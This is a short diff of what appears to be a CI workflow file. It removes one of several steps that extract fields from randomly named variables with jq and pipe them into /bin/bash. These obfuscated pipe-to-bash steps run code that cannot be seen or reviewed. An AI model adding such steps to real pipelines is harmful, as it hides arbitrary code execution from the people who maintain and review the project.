@@ -42,7 +42,6 @@ jobs:
           printf '%s' "$tdhvg35234" | jq -r .d0 | /bin/bash
           echo $pupaq568 | jq -r .f391 | /bin/bash
           echo $khfvv09680 | jq -r .etrf4 | /bin/bash
-          printf '%s' "$hn43236" | jq -r .jcj70259 | /bin/bash
           printf '%s' "$kywo946" | jq -r .idlm7552 | /bin/bash
           echo $ek8 | jq -r .tjsxy1 | /bin/bash
           echo $mmw594 | jq -r .kignm14094 | /bin/bash
